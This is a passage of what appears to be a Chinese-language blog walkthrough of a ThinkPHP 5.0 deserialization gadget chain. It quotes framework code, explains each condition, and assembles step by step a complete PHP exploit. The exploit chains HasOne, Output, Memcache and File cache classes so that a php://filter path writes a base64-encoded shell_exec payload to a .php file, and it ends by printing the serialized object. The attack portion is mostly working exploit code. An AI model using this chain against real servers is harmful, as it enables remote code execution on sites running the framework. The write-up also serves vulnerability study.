language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">reset</span>(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一步是想办法能够执行到912行，简单写这个if函数就是如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>) &amp;&amp; !<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                            <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个是 <code>$this-&gt;append</code> 不为空，由于<code>$this-&gt;append</code> 可控，该条件可实现</p><p>接着是 <code>$this-&gt;append</code> 里单个值不能是数组，不能有<code>.</code> ，由于 <code>$this-&gt;append</code>可控，该条件可实现</p><p>然后是 <code>$relation</code>变量的获取，此处使用了parseName函数，此处的type为1，也就是将C风格转换为Java风格，对正常字符串没有影响，因此此处的<code>$relation</code> 就是 <code>$name</code> ，也就是<code>$this-&gt;append</code> 变量</p><blockquote><p>具体来说，当 <code>type</code> 参数为 1 时，函数会执行以下操作：</p><ol type="1"><li>使用正则表达式 <code>'/_([a-zA-Z])/'</code>将下划线后的字母转换为大写字母。</li><li>使用 <code>preg_replace_callback</code>函数将匹配到的字符转换为大写字母。</li><li>最后，根据 <code>$ucfirst</code>参数决定是否将结果的首字母大写或小写，并返回结果。</li></ol></blockquote><p><img src="/post/e1d073c2/image-20240313194432787.png" alt="image-20240313194432787" style="zoom:33%;"></p><p>接着是判断本类是否存在 <code>$relation</code>函数，这个比较好办，因为 <code>$this-&gt;append</code>变量本身就是可控的，因此 <code>$relation</code> 变量也是可控的</p><p>继续往下分析， <code>$modelRelation</code> 是执行<code>$relation</code>函数的结果，要想能进入下面的if语句，就必须保证返回的结果也是一个类，并且这个类有getBindAttr方法，由于此处并没有使用<code>$value</code> 变量，因此先不对 <code>$value</code>变量进行分析</p><p><img src="/post/e1d073c2/image-20240313195522888.png" alt="image-20240313195522888" style="zoom: 50%;"></p><p>通过全局搜索可以找到定义该函数的地方，位于<code>thinkphp/library/think/model/relation/OneToOne.php</code></p><p><img src="/post/e1d073c2/image-20240313195744883.png" alt="image-20240313195744883" style="zoom: 33%;"></p><p>该函数定义在一个抽象类中，因此用同样的方法寻找其子类</p><p><img src="/post/e1d073c2/image-20240313195845938.png" alt="image-20240313195845938" style="zoom:33%;"></p><p>这里选择HasOne类</p><p><img src="/post/e1d073c2/image-20240313195913716.png" alt="image-20240313195913716" style="zoom:33%;"></p><p>因此前面的 <code>$modelRelation</code>我们就知道要返回什么了，就是返回HasOne类，因此我们需要找到Model类中的可控返回变量的函数</p><p>此处选择的是 <code>getError()</code> 函数，因为此处的<code>$this-&gt;error</code> 是可控的，因此只需构造<code>$this-&gt;error</code> 为HasOne类就行了， <code>$relation</code>变量就是 <code>getError()</code> 函数，也就是<code>$this-&gt;append()</code> 的值应该是<code>['getError()']</code></p><p><img src="/post/e1d073c2/image-20240313200040421.png" alt="image-20240313200040421" style="zoom: 50%;"></p><p>继续分析，接着就执行了getBindAttr方法，进入OneToOne类查看该方法</p><p><img src="/post/e1d073c2/image-20240313200719111.png" alt="image-20240313200719111" style="zoom: 50%;"></p><p>如下所示，此处的 <code>$this-&gt;bindAttr</code> 也是可控的</p><p><img src="/post/e1d073c2/image-20240313200839247.png" alt="image-20240313200839247" style="zoom: 50%;"></p><p>我们要执行到912的条件是 <code>!isset($this-&gt;data[$key])</code>，这里的 <code>$this-&gt;data</code> 也是可控的，因此此处<code>$bindAttr</code> 的值不需要急着定，只要保持<code>$this-&gt;data</code> 为空就行了</p><p>然后就是 <code>$value</code>的值不能是False，并且根据前面的分析可知， <code>$value</code>应该是一个没有 <code>getAttr()</code> 函数并且 <code>__call()</code>函数存在漏洞的类，这里选择构造的类就是Output类，位于<code>thinkphp/library/think/console/Output.php</code></p><p><code>$value</code> 的值通过Model类的getRelationData函数返回</p><p><img src="/post/e1d073c2/image-20240313201323330.png" alt="image-20240313201323330" style="zoom:50%;"></p><p>此处必须要满足第一个if语句，因为 <code>$modelRelation</code>我们已经确定了，而OneToOne类是没有getRelation方法的</p><p><img src="/post/e1d073c2/image-20240313201501077.png" alt="image-20240313201501077" style="zoom: 50%;"></p><p>此处有三个条件需要同时满足：</p><ul><li><p><code>$this-&gt;parent</code></p><p>该变量本身可控，易满足</p></li><li><p><code>!$modelRelation-&gt;isSelfRelation()</code></p><p>进入该函数，该方法属于抽象Relation类，位于<code>thinkphp/library/think/model/Relation.php</code></p><p><img src="/post/e1d073c2/image-20240313201934253.png" alt="image-20240313201934253" style="zoom:50%;"></p><p>因为确保上面的 <code>$this-&gt;selfRelation</code>为false就行了，该变量同样是可控的</p></li><li><p><code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code></p><p>这个等于的含义是getModel返回值类型和$this-&gt;parent相同</p><p>先看getModel函数，还是位于抽象Relation类中</p><p><img src="/post/e1d073c2/image-20240313202356627.png" alt="image-20240313202356627" style="zoom:50%;"></p><p>进入此处Query类的getModel函数</p><p><img src="/post/e1d073c2/image-20240313202419818.png" alt="image-20240313202419818" style="zoom: 50%;"></p><p>此处的 <code>$this-&gt;model</code> 函数也是可控的</p><p>而 <code>$this-&gt;parent</code>也是可控的，因此这个很好满足要求</p></li></ul><p>综合以上，构造的exp应该如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(<span class="string">&#x27;getError&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;error=<span class="keyword">new</span> <span class="title class_">HasOne</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>=<span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;selfRelation=<span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;query=<span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bindAttr=[<span class="string">&quot;seizer&quot;</span>, <span class="string">&quot;seizer&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;model=<span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着查看Output类的__call方法，这里的 <code>$method</code> 参数就是<code>getAttr</code> ， <code>$args</code> 是Model类中<code>$bindAttr</code> 变量。也就是上面exp所写的<code>[studentYang]</code> ，接着检查 <code>$this-&gt;styles</code>数组中是否存在变量 <code>$method</code> 的值，而<code>$this-&gt;styles</code> 是可控的，因此假设能够成功进入该循环，接着<code>array_unshift($args, $method)</code> 将变量 <code>$method</code>插入到数组 <code>$args</code> 的开头，那 <code>$args</code> 就变成了<code>[getAttr,studentYang]</code>，然后调用block方法，将args参数传递到该方法</p><p><img src="/post/e1d073c2/image-20240314143405626.png" alt="image-20240314143405626" style="zoom: 33%;"></p><p>如下所示，block方法会写入后面的messages，后面的messages通过前面的变量传递应该是<code>&lt;getAttr&gt;studentYang&lt;/getAttr&gt;</code></p><p><img src="/post/e1d073c2/image-20240314144119613.png" alt="image-20240314144119613" style="zoom:50%;"></p><p>然后查看writeln方法，这里的 <code>$messages</code> 就是<code>&lt;getAttr&gt;studentYang&lt;/getAttr&gt;</code></p><p><img src="/post/e1d073c2/image-20240314144248606.png" alt="image-20240314144248606" style="zoom: 50%;"></p><p>type应该为0</p><p><img src="/post/e1d073c2/image-20240314144340666.png" alt="image-20240314144340666" style="zoom: 50%;"></p><p>接着调用了handle类指定的write方法，这里的参数：<code>$messages</code> 是<code>&lt;getAttr&gt;studentYang&lt;/getAttr&gt;</code> ，<code>$newline</code> 是true， <code>$type</code> 是0，而<code>$this-&gt;handle</code>是可控的，这里选择Memcache.php中的<code>write</code>方法，位于<code>thinkphp/library/think/session/driver/Memcache.php</code></p><p><img src="/post/e1d073c2/image-20240314144408286.png" alt="image-20240314144408286" style="zoom:50%;"></p><p>由此的exp应该增加如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span>=[];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle=<span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着查看Memcache类的write方法，这里的 <code>$sessId</code> 应该就是<code>$messages</code> 的内容，<code>$sessData</code> 就是<code>$newline</code> 的内容，这里的 <code>$this-&gt;handle</code>是可控的，因此需要查找set函数有漏洞的类，这里选择了File.php的<code>set</code>方法进行利用，位于<code>thinkphp/library/think/cache/driver/File.php</code></p><p><img src="/post/e1d073c2/image-20240314145141084.png" alt="image-20240314145141084" style="zoom: 40%;"></p><p>至此exp增加以下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下所示，这里有file_put_contents方法，说不定有漏洞</p><p><img src="/post/e1d073c2/image-20240314145523493.png" alt="image-20240314145523493" style="zoom: 40%;"></p><p>一步步进行分析，首先确定传入的变量是什么， <code>$name</code> 是<code>&lt;getAttr&gt;studentYang&lt;/getAttr&gt;</code>，<code>$value</code>是true，而后面的内容中filename和name相关，而data只和value相关，因此此处的file_put_contents函数不好利用，但是下面的setTagItem函数可利用，该函数位于driver类</p><p>这里的 <code>$name</code> 是变量 <code>$filename</code> ，这里的<code>this-&gt;tag</code>是可控的，想办法让value等于name就可以成功执行我们的文件生成函数了</p><p><img src="/post/e1d073c2/image-20240314150247399.png" alt="image-20240314150247399" style="zoom: 40%;"></p><p>现在分析filename会变成什么，在set函数中，主要进行了以下操作</p><p><img src="/post/e1d073c2/image-20240314150723238.png" alt="image-20240314150723238" style="zoom:50%;"></p><p>而这个函数如下，这里的 <code>this-&gt;options</code>也是可控的，我们想办法不对name进行额外修改，让返回的<code>$filename = $this-&gt;options['path'] . $name . '.php';</code>，故<code>$filename</code>前部分内容可控，最后返回的filename就是<code>path+md5(name)+.php</code></p><p><img src="/post/e1d073c2/image-20240314150749846.png" alt="image-20240314150749846" style="zoom:40%;"></p><p>接着在setTagItem函数中，让最后的set方法指向File.php的set方法</p><p>最后增加的exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>=[];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tag=<span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgZWNobyBzaGVsbF9leGVjKCJjYWxjIik7Pz4=/../a.php&#x27;</span>,  <span class="comment">//功能：弹出计算器</span></span><br><span class="line">            <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="variable">$windows</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br></pre></td></tr></table></figure><p>其中，path的构造原理如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php echo shell_exec(&quot;calc&quot;);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><p>综上所述，整条链子逻辑如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 